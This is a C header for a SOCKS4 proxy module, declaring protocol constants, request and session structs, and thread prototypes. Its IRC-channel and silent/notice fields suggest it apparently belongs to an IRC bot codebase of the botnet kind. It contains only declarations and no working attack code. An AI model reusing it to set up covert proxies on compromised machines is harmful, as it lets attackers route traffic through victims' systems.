#ifndef NO_SOCK4SERV
#define SOCKS4_CONNECT 1
#define SOCKS4_BIND 2
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91
#define SOCKS4_REJECT_IDENTD 92
#define SOCKS4_REJECT_USERID 93

typedef struct SOCKS4HEADER 
{
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];

} SOCKS4HEADER;

typedef struct SOCKS4 
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	char userid[16];
	unsigned short port;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} SOCKS4;

 
DWORD WINAPI Socks4Thread(LPVOID param);
DWORD WINAPI Socks4ClientThread(LPVOID param);
void TransferLoop(SOCKET tsock, SOCKET csock);
#endif
